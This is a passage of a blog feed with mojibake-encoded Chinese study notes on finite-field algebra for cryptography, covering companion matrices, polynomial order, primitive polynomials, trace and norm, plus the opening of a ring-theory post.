href="#æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º" class="headerlink" title="æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º"></a>æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º</h2><h3 id="ä¼´éšçŸ©é˜µ-companion-matrix"><a href="#ä¼´éšçŸ©é˜µ-companion-matrix" class="headerlink" title="ä¼´éšçŸ©é˜µ(companion matrix)"></a>ä¼´éšçŸ©é˜µ(companion matrix)</h3><p><strong>å®šä¹‰(ä¼´éšçŸ©é˜µ):</strong>è®¾$K$æ˜¯åŸŸï¼Œ$f(x)=a_0+a_1x+\cdots+a_{n-1}x^{n-1}+x^n\in$<br>$K[X]$æ˜¯é¦–ä¸€å¤šé¡¹å¼ã€‚$f(x)$çš„ä¼´éšçŸ©é˜µæ˜¯å¦‚ä¸‹çš„$n\times n$çŸ©é˜µï¼š<img src="https://img.simpletex.net/pdf/BzBdZhBa/fQEB1mkZp284u22sUFSrikvtsU9gt5e7e.png" alt></p><script type="math/tex; mode=display">f(A)=a_0I+a_1A+\cdots+a_{n-1}A^{n-1}+A^n=\theta</script><p>å…¶ä¸­ï¼Œ$I$ä¸º$n\times n$å•ä½çŸ©é˜µ</p><h3 id="åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ"></a>åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ</h3><p>ä¸€.è®¾$f(x)\in F_p\left[X\right]$æ˜¯<strong>é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼</strong>ï¼Œåº¦ä¸º$n$</p><ol><li>$A$æ˜¯$f(x)$çš„ä¼´éšçŸ©é˜µï¼Œåˆ™æœ‰ $f(A)=\theta$</li><li>æ„é€ ä¸€ç»„åŸº$I,A,â€¦,A^{n-1}$</li><li>$F_{p^n}$çš„å…ƒç´ ä¸º $b_0I+b_1A+\cdots+b_{n-1}A^{n-1}$,å…¶ä¸­ $b_0,b_1,â€¦,b_{n-1}\in F_p$</li></ol><p>äºŒ.$è®¾F_qæ˜¯F_pçš„æ‰©åŸŸ,åˆ™F_qæ˜¯F_pä¸Šçš„q-1æ¬¡åˆ†åœ†åŸŸ$</p><ol><li>$Q_{q-1}(x)åˆ†è§£ä¸ºé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯,f(x)æ˜¯å…¶ä¸­ä¸€ä¸ªå¤šé¡¹å¼ã€‚$</li><li>$ä»¤Cæ˜¯f(x)çš„ä¼´éšçŸ©é˜µ,åˆ™f(C)=\theta,æœ‰Q_{q-1}(C)=\theta$</li><li>$Cæ˜¯Q_{q-1}(x)çš„æ ¹,ä¹Ÿæ˜¯F_qçš„æœ¬åŸå…ƒ$</li><li>$F_qçš„å…ƒç´ ä¸º\theta,C,\ldots,C^{q-1}$</li></ol><hr><h2 id="å¤šé¡¹å¼çš„é˜¶-order"><a href="#å¤šé¡¹å¼çš„é˜¶-order" class="headerlink" title="å¤šé¡¹å¼çš„é˜¶(order)"></a>å¤šé¡¹å¼çš„é˜¶(order)</h2><script type="math/tex; mode=display">\begin{aligned}&\text{å®šä¹‰(å¤šé¡¹å¼çš„é˜¶):åˆç§°å¤šé¡¹å¼çš„å‘¨æœŸ(period)ã€å¤šé¡¹å¼çš„æŒ‡æ•°}\\&(\text{exponent)ã€‚è®¾}f(x)\text{æ˜¯æœ‰é™åŸŸä¸Šçš„éé›¶å¤šé¡¹å¼,åˆ™}\\&Â·f(x)çš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒ:ä½¿å¾—f(x)|(x^n-e)çš„æœ€å°æ­£æ•´æ•°n,\\&\text{ç§°ä¸º}f(x)\text{çš„é˜¶,è®°ä¸º }ord\left(f(x)\right)\text{ã€‚}\\&Â·f(x)\text{çš„å¸¸æ•°é¡¹ä¸ºé›¶å…ƒ:è®¾}f(x)=x^tf^{\prime}(x)\text{(}f^{\prime}(x)\text{çš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶}\\&\text{å…ƒ),åˆ™ }ord\left(f(x)\right)=ord\left(f^{\prime}(x)\right)\end{aligned}</script><p><strong>æ€§è´¨</strong>ï¼šè®¾$f(x)\in F_q[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ï¼Œå®ƒçš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒï¼Œåˆ™å­˜åœ¨æ­£æ•´æ•°$n\leq q^m-1$,ä½¿å¾—$f(x)|(x^n-e)$<br>ç‰¹åˆ«åœ°ï¼š</p><ol><li><strong>å¸¸æ•°å¤šé¡¹å¼çš„é˜¶ä¸º1</strong> (è¯æ˜ï¼šè®¾$a\in F_q[X]$æ˜¯å¸¸æ•°å¤šé¡¹å¼ï¼Œåˆ™ $x-e=aa^{-1}(x-$<br>$e)$,æœ‰$a|(x-e)$,å³$ord(a)=1)$</li><li><strong>å¤šé¡¹å¼$x$ çš„é˜¶ä¸º1</strong> (è¯æ˜ï¼šè®¾$f(x)=x$,å¸¸æ•°é¡¹ä¸ºé›¶å…ƒï¼Œåˆ™ $f(x)=xf^{\prime}(x)ï¼Œfâ€™(x)=e\text{,æœ‰}ord\big(f(x)\big)=ord(fâ€™(x))=ord(e)=1\big)$</li></ol><h3 id="è®¡ç®—å¤šé¡¹å¼çš„é˜¶"><a href="#è®¡ç®—å¤šé¡¹å¼çš„é˜¶" class="headerlink" title="è®¡ç®—å¤šé¡¹å¼çš„é˜¶"></a>è®¡ç®—å¤šé¡¹å¼çš„é˜¶</h3><ol><li>å°†å¤šé¡¹å¼f(x)å› å¼åˆ†è§£æˆé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯</li><li>åˆ†åˆ«ç®—å‡ºè¿™äº›é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„é˜¶</li><li>ç”¨è¿™äº›é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„é˜¶ç®—å‡ºf(x)çš„é˜¶</li></ol><p><strong>å®šç†1</strong>ï¼šè®¾ $f(x)=g_1(x)g_2(x)â€¦g_k(x)$æ˜¯æœ‰é™åŸŸä¸Šçš„å¤šé¡¹å¼ï¼Œ$g_1(x),â€¦,g_k(x)$ä¸¤ä¸¤äº’ç´ çš„éé›¶å¤šé¡¹å¼ï¼Œåˆ™</p><p>$ord(f(x))=lcm(ord(g_1(x)),â€¦,ord(g_k(x)))$ã€‚</p><p><strong>å®šç†2</strong>ï¼š$g(x)\in F_q[X]$æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåº¦ä¸º$m$,é˜¶ä¸º$n$,å¸¸æ•°<br>é¡¹ä¸ä¸ºé›¶å…ƒã€‚$a\in F_{q^m}^*,g(a)=\theta$,åˆ™ $n$ç­‰äº$a$åœ¨$F_q^m$é‡Œçš„é˜¶</p><p><strong>æ¨è®º</strong>ï¼š$g(x)\in F_q[X]æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåº¦ä¸ºmï¼Œåˆ™ord(g(x))|(q^m-1)$</p><p><strong>å®šç†3</strong>ï¼š$g(x)\in F_q[X]$æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œé˜¶ä¸º$n$,å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒï¼Œåˆ™$ord( g( \boldsymbol{x}) ^b) = \boldsymbol{n}p^t$ $( \boldsymbol{b}$æ˜¯æ­£æ•´æ•°),å…¶ä¸­$p$æ˜¯$F_q$çš„ç‰¹å¾,$t$æ˜¯æ»¡è¶³$p^t\geq b$çš„æœ€å°æ•´æ•°ã€‚</p><p><strong>å®šç†4</strong>ï¼š$f(x)\in F_q[X]\text{æ˜¯éå¸¸æ•°å¤šé¡¹å¼,å®ƒçš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒ,}$</p><p>$f(x)=ag_1^{b_1}(x)â€¦g_k^{b_k}(x)$</p><p>$a\in F_q,b_1,â€¦,b_k\text{æ˜¯æ­£æ•´æ•°,}g_1(x)â€¦,g_k(x)\in F_q[X]\text{æ˜¯ä¸¤ä¸¤äº’ç´ çš„é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼,åˆ™ }$</p><p>$ord(f(x))=np^t\text{,å…¶ä¸­}p\text{æ˜¯}F_q\text{çš„ç‰¹å¾,}t\text{æ˜¯æ»¡è¶³}p^t\geq max(b_1,â€¦,b_k)\text{ çš„æœ€å°æ•´æ•°,}$</p><p>$n=lcm(ord(g_1(x)),â€¦,ord(g_k(x)))\text{ã€‚}$</p><blockquote><script type="math/tex; mode=display">\begin{aligned}&\text{ä¾‹ï¼š}f(x)=x^{10}+x^9+x^3+x^2+e\in F_2[X] \\&1.f(x)=\left(x^2+x+e\right)^3(x^4+x+e) \\&2.\left(x^2+x+e\right)^3\text{çš„é˜¶ä¸º12} \\&3.x^4+x+e\text{çš„é˜¶ä¸º15}(å®šç†2ã€æ¨è®º) \\&4.f(x)\text{çš„é˜¶ä¸º}lcm(12,15)=60(å®šç†1) \end{aligned}</script></blockquote><hr><h2 id="æœ¬åŸå¤šé¡¹å¼-primitive-polynomial"><a href="#æœ¬åŸå¤šé¡¹å¼-primitive-polynomial" class="headerlink" title="æœ¬åŸå¤šé¡¹å¼(primitive polynomial)"></a>æœ¬åŸå¤šé¡¹å¼(primitive polynomial)</h2><p>æœ‰é™åŸŸé‡Œæœ¬åŸå…ƒçš„æå°å¤šé¡¹å¼</p><p><strong>å®šä¹‰(æœ¬åŸå¤šé¡¹å¼):</strong> $f(x)\in F_q[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ï¼Œåº¦ä¸º$m$,è®¾$a\in F_q^m$æ˜¯æœ¬åŸå…ƒï¼Œå¦‚æœ$f(x)$æ˜¯$a$åœ¨$F_q$ä¸Šçš„æå°å¤šé¡¹å¼ï¼Œåˆ™$f(x)$ç§°ä¸º$F_q$ä¸Šçš„æœ¬åŸå¤šé¡¹å¼ã€‚</p><ul><li>æå°å¤šé¡¹å¼$\Rightarrow$ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåˆ™ æœ¬åŸå¤šé¡¹å¼$\Rightarrow$ä¸å¯çº¦å¤šé¡¹å¼</li><li>$f( a) = \theta$, $a\in F_{q^m}$æ˜¯æœ¬åŸå…ƒï¼Œåˆ™ $f(x)$çš„æ ¹$a$æ˜¯$F_q^m$çš„ç”Ÿæˆå…ƒ</li></ul><p>$å®šç†1:f(x)\in F_q[X]$,åº¦ä¸º$m$,åˆ™ $f(x)$æ˜¯$F_q$ä¸Šçš„æœ¬åŸå¤šé¡¹å¼$\Leftrightarrow f(x)$æ˜¯é¦–ä¸€çš„ï¼Œå¸¸æ•°é¡¹éé›¶å…ƒï¼Œ$ord(f(x))=q^m-1$</p><script type="math/tex; mode=display">\begin{aligned}&\text{å®šç†2:}f(x)\in F_q[X]\text{æ˜¯éå¸¸æ•°é¦–ä¸€å¤šé¡¹å¼,åº¦ä¸º}m\text{,}a=(-1)^mf(0)\text{,åˆ™}\\&f(x)\text{æ˜¯}F_q\text{ä¸Šçš„æœ¬åŸå¤šé¡¹å¼}\Leftrightarrow a\in F_q\text{æ˜¯æœ¬åŸå…ƒ,}r=\frac{q^m-1}{q-1}\text{æ˜¯æ»¡è¶³ }x^r\mathrm{~mod~}f(x)\\&\text{ç­‰äº}F_q\text{çš„æŸä¸ªå…ƒç´ çš„æœ€å°æ­£æ•´æ•°ã€‚å¦å¤–,}f(x)\text{æ˜¯}F_q\text{ä¸Šçš„æœ¬åŸå¤šé¡¹å¼}\Longrightarrow x^r\equiv\\&a\left(mod\ f(x)\right)ã€‚\end{aligned}</script><hr><h2 id="æ„é€ ä¸å¯çº¦å¤šé¡¹å¼"><a href="#æ„é€ ä¸å¯çº¦å¤šé¡¹å¼" class="headerlink" title="æ„é€ ä¸å¯çº¦å¤šé¡¹å¼"></a>æ„é€ ä¸å¯çº¦å¤šé¡¹å¼</h2><h3 id="æ„é€ æå°å¤šé¡¹å¼"><a href="#æ„é€ æå°å¤šé¡¹å¼" class="headerlink" title="æ„é€ æå°å¤šé¡¹å¼"></a>æ„é€ æå°å¤šé¡¹å¼</h3><p>æå°å¤šé¡¹å¼æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ä¸å¯çº¦å¤šé¡¹å¼ï¼Œè¦æ„é€ ä¸å¯çº¦å¤šé¡¹å¼ï¼Œæ„é€ ä¸€ä¸ªæå°å¤šé¡¹å¼å³å¯ã€‚</p><p>$F_q:$åŸºåŸŸ<br>$F_{q^m}:$å‘é‡ç©ºé—´<br>$a\in F_{q^m}:$å®šä¹‰å…ƒç´ <br>$e,a,â€¦,a^{m-1}:$åŸº<br>è®¾$b\in F_{q^m}$çš„æå°å¤šé¡¹å¼æ˜¯$g(x)=d_0+d_1x+\cdots+d_mx^m\in F_q[X]$ ,åˆ™$g(b)=\theta$ </p><h3 id="æ„é€ æœ¬åŸå¤šé¡¹å¼-primitive-polynomial"><a href="#æ„é€ æœ¬åŸå¤šé¡¹å¼-primitive-polynomial" class="headerlink" title="æ„é€ æœ¬åŸå¤šé¡¹å¼(primitive polynomial)"></a>æ„é€ æœ¬åŸå¤šé¡¹å¼(primitive polynomial)</h3><p><strong>å®šä¹‰(æœ¬åŸå¤šé¡¹å¼)</strong>:$f(x)\in F_q[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ï¼Œåº¦ä¸º$m$,è®¾$a\in F_q^m$æ˜¯æœ¬åŸå…ƒï¼Œå¦‚æœ$f(x)$æ˜¯$a$åœ¨$F_q$ä¸Šçš„æå°å¤šé¡¹å¼ï¼Œåˆ™$f(x)$ç§°ä¸º$F_q$ä¸Šçš„æœ¬åŸå¤šé¡¹å¼ã€‚</p><p>$F_{q^m}$é‡Œéé›¶å…ƒç´ ä¸ªæ•°$:q^{m-1}$ æœ¬åŸå…ƒçš„é˜¶ï¼š$q^m-1$</p><p>è®¾ $q^m-1=h_1â€¦h_k$,å…¶ä¸­æ­£æ•´æ•°$h_1,â€¦,h_k$å½¼æ­¤äº’ç´ ï¼Œè®¾éé›¶å…ƒç´  $a_i\in F_{q^m}^*$çš„é˜¶ä¸º$h_i$,åˆ™<br>$c=a_1â€¦a_k$çš„é˜¶ä¸º$q^m-1$,</p><p>å³ $c\in F_q^m$æ˜¯æœ¬åŸå…ƒã€‚</p><p><strong>å®šç†</strong>ï¼šè®¾ $g(x)$æ˜¯$F_q$ä¸Šåº¦ä¸º$m$çš„ä¸å¯çº¦å¤šé¡¹å¼ï¼Œ$c\in F_{q^m},g(c)=\theta$,åˆ™$g(x)$çš„æ ¹ä¸º$c,c^q,c^{q^2},\dots ,c^{q^{m-1}}$</p><hr><h2 id="è¿¹-trace"><a href="#è¿¹-trace" class="headerlink" title="è¿¹(trace)"></a>è¿¹(trace)</h2><p><strong>å®šä¹‰(è¿¹)</strong>:<script type="math/tex">è®¾ a\in F=F_{q^m}, K=F_q, aåœ¨Kä¸Šçš„è¿¹Tr_{F/K}(a)å®šä¹‰ä¸º\\Tr_{F/K}(a)=a+a^q+\cdots+a^{q^{m-1}}\\å¦‚æœKæ˜¯ç´ å­åŸŸ,Tr_{F/K}(a)ç§°ä¸ºâ€œç»å¯¹è¿¹â€(absolute trace),ç®€è®°ä¸ºTr_F(a)</script></p><p><strong>è¿¹çš„å€¼åŸŸæ˜¯å­åŸŸKï¼Œç®—å‡ºæ¥æ˜¯Kä¸­çš„ä¸€ä¸ªå…ƒç´ </strong></p><h3 id="ç‰¹å¾å¤šé¡¹å¼-characteristic-polynomial"><a href="#ç‰¹å¾å¤šé¡¹å¼-characteristic-polynomial" class="headerlink" title="ç‰¹å¾å¤šé¡¹å¼ (characteristic polynomial)"></a>ç‰¹å¾å¤šé¡¹å¼ (characteristic polynomial)</h3><p><strong>å®šä¹‰ (ç‰¹å¾å¤šé¡¹å¼)</strong>:è®¾ $g(x)\in K[X]$æ˜¯$a$åœ¨$K$ä¸Šçš„æå°å¤šé¡¹å¼ã€‚$g(x)$çš„åº¦ä¸º$d,d\mid m$,åˆ™ $g(x)^{m/d}\in K[X]$ ç§°ä½œ$a$åœ¨$K$ä¸Šçš„ç‰¹å¾å¤šé¡¹å¼ã€‚</p><script type="math/tex; mode=display">\text{è®¾ }g(x)^{m/d}=a_0+a_1x+\cdots+a_{m-1}x^{m-1}+x^m\text{ã€‚}g(x)\text{ çš„æ ¹æ˜¯}\\a,a^q,...,a^{q^{d-1}}\in F,\text{ åˆ™ }g(x)^{m/d}\text{çš„æ ¹æ˜¯ }a,a^q,...,a^{q^{m-1}}\in F,\text{ æœ‰}\\g(x)^{m/d}=(x-a)(x-a^q)...(x-a^{q^{m-1}})ã€‚\\\text{æ•´ç† }g(x)^{m/d}\text{ çš„ä¸¤ä¸ªè¡¨è¾¾å¼å¯çŸ¥,}Tr_{F/K}(a)=-a_{m-1}\text{ã€‚}</script><p><strong>å®šä¹‰(è¿¹çš„ä¼ é€’æ€§)</strong>ï¼šè®¾ $F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$K$æ˜¯$L$çš„æ‰©åŸŸï¼Œå¯¹äºæ‰€æœ‰çš„$a\in F$,æœ‰<br>$Tr_{F/L}(a)=Tr_{K/L}(Tr_{F/K}(a))$</p><p><strong>è¿¹çš„æ€§è´¨</strong>ï¼š</p><p>è¿¹çš„æ€§è´¨ï¼šè®¾$F=F_q^m,K=F_q$,è¿¹å‡½æ•°$Tr_{F/K}$æ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼š<br>$(1)Tr_{F/K}(a+b)=Tr_{F/K}(a)+Tr_{F/K}(b)$,å¯¹äºæ‰€æœ‰$a,b\in F$<br>$(2)Tr_{F/K}(c\cdot a)=c\cdot Tr_{F/K}(a)$,å¯¹äºæ‰€æœ‰$c\in K,a\in F$<br>$(3)Tr_{F/K}$æ˜¯ä»$F$åˆ°Kçš„çº¿æ€§å˜æ¢ï¼Œå…¶ä¸­$F$å’Œ$K$éƒ½çœ‹ä½œæ˜¯$K$çš„å‘é‡ç©ºé—´<br>$(4)Tr_{F/K}(c)=mc$,å¯¹äºæ‰€æœ‰$c\in K$<br>$(5)Tr_{F/K}(a^q)=Tr_{F/K}(a)$,å¯¹äºæ‰€æœ‰$a\in F$</p><h3 id="è¿¹çš„åº”ç”¨"><a href="#è¿¹çš„åº”ç”¨" class="headerlink" title="è¿¹çš„åº”ç”¨"></a>è¿¹çš„åº”ç”¨</h3><p>$K=F_q:$åŸºåŸŸ<br>$F=F_{q^m}$:å‘é‡ç©ºé—´<br>$a_1,â€¦,a_m:$åŸº($å¯¹å¶åŸºï¼šb_1,â€¦,b_m$ï¼‰<br>è®¾$c\in F$,æœ‰$c=c_1a_1+\cdots+c_ma_m$<br>$= Tr_{F/ K}( b_1c) a_1+ \cdots + Tr_{F/ K}( b_mc) a_m$ ,<br>$b_1,â€¦,b_m\in F$<br>å…³ç³»å¼ï¼š$c_j=Tr_{F/K}(b_jc)$</p><script type="math/tex; mode=display">i\neq j:Tr_{F/K}(b_j a_i)=\theta\\i=j:Tr_{F/K}(b_j a_i)=e</script><h4 id="å¯¹å¶åŸº-dual-basis"><a href="#å¯¹å¶åŸº-dual-basis" class="headerlink" title="å¯¹å¶åŸº(dual basis)"></a>å¯¹å¶åŸº(dual basis)</h4><p><strong>å®šä¹‰ (å¯¹å¶åŸº)</strong>:è®¾$F$å’Œ$K$æ˜¯æœ‰é™åŸŸï¼Œ$F$æ˜¯Kçš„æ‰©åŸŸï¼Œ${a_1,â€¦,a_m}$å’Œ${b_1,â€¦,b_m}$<br>æ˜¯$K$ä¸Š$F$çš„ä¸¤ç»„åŸºã€‚å¦‚æœå¯¹äº$1\leq i,j\leq m$,æœ‰</p><script type="math/tex; mode=display">i\neq j:Tr_{F/K}(b_j\:a_i)=\theta\\i=j:Tr_{F/K}(b_j\:a_i)=e</script><p>åˆ™ ${a_1,â€¦,a_m}$å’Œ${b_1,â€¦,b_m}$ç§°ä¸ºå¯¹å¶åŸºï¼Œä¹Ÿç§°äº’è¡¥åŸº (complementary basis)ã€‚<br>${a_1,â€¦,a_m}={b_1,â€¦,b_m}$æ—¶ï¼Œ${a_1,â€¦,a_m}$å«è‡ªå¯¹å¶åŸº(self-dual basis)ã€‚</p><p>æ¯ä¸ªåŸºçš„å¯¹å¶åŸºï¼šéƒ½<strong>å­˜åœ¨</strong>ä¸”<strong>å”¯ä¸€</strong></p><hr><h2 id="èŒƒ-norm"><a href="#èŒƒ-norm" class="headerlink" title="èŒƒ(norm)"></a>èŒƒ(norm)</h2><p><strong>å®šä¹‰ (èŒƒ)</strong>: è®¾ $a\in F= F_q^m, K= F_q$, $a$åœ¨$K$ä¸Šçš„èŒƒ$N_F/K(a)$å®šä¹‰ä¸º<br>$N_{F/K}(a)=a\cdot a^q\cdot\cdots\cdot a^{q^{m-1}}=a^{\frac{q^m-1}{q-1}}$</p><p>è®¾ $g(x)\in K[X]$æ˜¯$a$åœ¨$K$ä¸Šçš„æå°å¤šé¡¹å¼ã€‚$g(x)$çš„åº¦ä¸º$d,d\mid m$,åˆ™<br>$g(x)^{m/d}\in K[X]$ ç§°ä½œ$a$åœ¨$K$ä¸Šçš„ç‰¹å¾å¤šé¡¹å¼ã€‚<br>è®¾$g(x)^{m/d}=a_0+a_1x+\cdots+a_{m-1}x^{m-1}+x^m$ã€‚$g(x)$çš„æ ¹æ˜¯<br>$a,a^q,â€¦,a^{q^{d-1}}\in F$,åˆ™ $g(x)^{m/d}$çš„æ ¹æ˜¯ $a,a^q,â€¦,a^{q^{m-1}}\in F$,æœ‰<br>$g(x)^{m/d}=(x-a)(x-a^q)â€¦(x-a^{q^{m-1}})$ã€‚<br>æ•´ç†$g(x)^{m/d}$çš„ä¸¤ä¸ªè¡¨è¾¾å¼å¯çŸ¥ï¼Œ$N_{F/K}(a)=(-1)^ma_0$ã€‚</p><p><strong>å®šä¹‰ (èŒƒçš„ä¼ é€’æ€§)</strong>:è®¾ $F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$K$æ˜¯$L$çš„æ‰©åŸŸï¼Œå¯¹äºæ‰€æœ‰çš„$a\in\mathcal{F}$,æœ‰$N_{F/L}(a)=N_{K/L}(N_{F/K}(a))$</p><script type="math/tex; mode=display">\begin{aligned}&\text{èŒƒçš„æ€§è´¨:è®¾ }F=F_{q^m}, K=F_q, \text{èŒƒå‡½æ•° }N_{F/K} \text{æ»¡è¶³ä»¥ä¸‹æ€§è´¨}:\\&(1) N_{F/K}(a\cdot b)=N_{F/K}(a)\cdot N_{F/K}(b)\text{,å¯¹äºæ‰€æœ‰}a,b\in F\\&(2) N_{F/K}\text{å°†}F\text{æ˜ å°„åˆ°}K\text{,å°†}F^*\text{æ˜ å°„åˆ°}K^*\\&(3) N_{F/K}(c)=c^m, \text{å¯¹äºæ‰€æœ‰}c\in K\\&(4) N_{F/K}(a^q)=N_{F/K}(a), \text{å¯¹äºæ‰€æœ‰}a\in F\end{aligned}</script><h2 id="ä»£æ•°é—­åŒ…-algebraic-closure"><a href="#ä»£æ•°é—­åŒ…-algebraic-closure" class="headerlink" title="ä»£æ•°é—­åŒ…(algebraic closure)"></a>ä»£æ•°é—­åŒ…(algebraic closure)</h2><script type="math/tex; mode=display">\begin{aligned}&\text{è®¾}K\text{æ˜¯åŸŸ,}K\text{çš„ä»£æ•°é—­åŒ…}\overline{K}\text{æ˜¯åŒ…å«}K\text{å’Œ}K[X]\text{é‡Œæ‰€æœ‰å¤šé¡¹å¼çš„æ ¹çš„æœ€}\text{å°æ‰©åŸŸã€‚}\\&\overline{K}=K(a_1,a_2,a_3,...)\\&\text{å…¶ä¸­,}a_1,a_2,a_3,...\text{æ˜¯}K[X]\text{é‡Œæ‰€æœ‰å¤šé¡¹å¼çš„æ ¹ã€‚}\end{aligned}</script><p>$\overline{K}$åŒ…å«$K$çš„æ‰€æœ‰ä»£æ•°å…ƒç´    </p><p>ä¾‹ï¼šå¤æ•°åŸŸCæ˜¯å®æ•°åŸŸRçš„ä»£æ•°é—­åŒ…</p><hr><h1 id="å®Œç»“æ’’èŠ±"><a href="#å®Œç»“æ’’èŠ±" class="headerlink" title="å®Œç»“æ’’èŠ±"></a>å®Œç»“æ’’èŠ±</h1><p>å¤ªç—›è‹¦äº†ï¼Œæˆ‘ä»æ¥æ²¡æœ‰è§‰å¾—å­¦ä¹ æŠ½è±¡ä»£æ•°å¼€å¿ƒè¿‡ã€‚</p><p>â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)/$:</em>.Â°â˜…<em> ã€‚<em>*çˆ±æ¥è‡ªğŸ˜½C.A.TğŸ˜¸å–µ</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> æœ‰é™åŸŸ </tag>
            
            <tag> æŠ½è±¡ä»£æ•° </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æŠ½è±¡ä»£æ•°Â·ç¯è®º</title>
      <link href="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/"/>
      <url>/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸‰ï¼ˆç¯è®ºï¼‰</h2><hr><h1 id="ç¯è®º"><a href="#ç¯è®º" class="headerlink" title="ç¯è®º"></a>ç¯è®º</h1><p><em>ringå•Šringå•Šringï¼Œçˆ±çš„å’Œå¼¦é“ƒï¼Œyeahï¼</em></p><hr><h2 id="ç¯-ring"><a href="#ç¯-ring" class="headerlink" title="ç¯(ring)"></a>ç¯(ring)</h2><script type="math/tex; mode=display">(R,+,\cdot)\\\ RæŒ‡éç©ºé›†åˆï¼Œ+æŒ‡åŠ æ³•ï¼Œ\cdotæŒ‡ä¹˜æ³•(åŠ æ³•ä¹˜æ³•æ˜¯æŠ½è±¡æ¦‚å¿µï¼Œä¸æ˜¯ç®—æ•°åŠ æ³•å’Œä¹˜æ³•)</script><ul><li><p><strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong>ï¼š($R,+)$æ˜¯é˜¿è´å°”ç¾¤</p></li><li><p><strong>ä¹˜æ³•åŠç¾¤</strong>ï¼š$(R,\cdot)æ˜¯åŠç¾¤ï¼Œæ»¡è¶³å°é—­æ€§ã€ç»“åˆå¾‹$</p></li><li><p><strong>åˆ†é…å¾‹</strong>ï¼š$\forall a, b, c\in R$, $a\cdot ( b+ c) = a\cdot b+ a\cdot c$</p><p>$(b+c)\cdot a=b\cdot a+c \cdot a$</p></li></ul><p><strong>ç¯å¯ä»¥è¡¨ç¤ºå½¢å¦‚</strong><script type="math/tex">a_0+a_1\cdot x+\cdots+a_n\cdot x^n\\\text{å…¶ä¸­ }a_0,a_1,...a_n\in(R,+,\cdot)</script>çš„<strong>å¤šé¡¹å¼</strong></p><p><strong>æœ‰é™ç¯</strong>:ç¯çš„å…ƒç´ æ•°é‡æ˜¯æœ‰é™çš„</p><p><strong>æ— é™ç¯</strong>:ç¯çš„å…ƒç´ æ•°é‡æ˜¯æ— é™çš„</p><blockquote><p><strong>ä¾‹1</strong>ï¼š$æ•´æ•°ç¯(\mathbb{Z},+,\times):$</p><ul><li>$(\mathbb{Z},+)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$(\mathbb{Z},\times)æ»¡è¶³å°é—­æ€§ã€ç»“åˆå¾‹$</li><li>$\times å¯¹+æ»¡è¶³åˆ†é…å¾‹$</li></ul><p><strong>ä¾‹2</strong>ï¼š$\text{æœ‰ç†æ•°ç¯ }(\mathbb{Q},+,\times)\text{ã€å®æ•°ç¯ }(\mathbb{R},+,\times)$</p><p><strong>ä¾‹3</strong>ï¼š$(\mathbb{Z}_n,+,\times)$ æ˜¯ä¸ªç¯ï¼Œ$n$æ˜¯æ­£æ•´æ•°</p><ul><li>$(\mathbb{Z}_n,+)$æ˜¯é˜¿è´å°”ç¾¤</li><li>$(\mathbb{Z}_n,\times)$æ»¡è¶³å°é—­æ€§ã€ç»“åˆå¾‹</li><li>$\times$å¯¹$+$æ»¡è¶³åˆ†é…å¾‹ (æ¨¡è¿ç®—ä¸‹)</li></ul></blockquote><h3 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" 